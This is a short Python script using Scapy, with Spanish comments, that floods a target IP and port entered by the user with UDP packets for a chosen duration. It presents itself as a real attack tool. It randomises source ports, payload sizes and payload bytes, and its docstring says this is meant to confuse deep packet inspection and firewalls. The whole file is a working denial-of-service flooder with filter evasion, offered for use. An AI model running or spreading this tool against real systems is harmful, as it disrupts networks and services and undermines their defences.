from scapy.all import *
import random
import time

def random_payload(size):
    """Payload hexadecimal dinámico que varía para confundir DPI/firewalls"""
    base = bytes.fromhex(''.join(random.choices('0123456789abcdef', k=size * 2)))
    header = b"\xfa\xce\xf0\x0dBYPASS"
    return header + base

def unconnected_udp_bypass(ip, port, duration):
    print(f"[+] Iniciando ataque REAL UDP BYPASS a {ip}:{port} durante {duration}s")
    timeout = time.time() + duration

    while time.time() < timeout:
        sport = random.randint(10000, 65535)  # cambia puerto origen
        size = random.randint(512, 1024)      # payload variable
        pkt = IP(dst=ip) / UDP(sport=sport, dport=port) / Raw(load=random_payload(size))
        send(pkt, verbose=0)

    print("[+] Ataque completado.")

def main():
    print("=== ATAQUE UDP REAL + BYPASS ===")
    ip = input("IP destino: ")
    port = int(input("Puerto: "))
    duration = int(input("Duración en segundos: "))
    unconnected_udp_bypass(ip, port, duration)

if __name__ == "__main__":
    main()
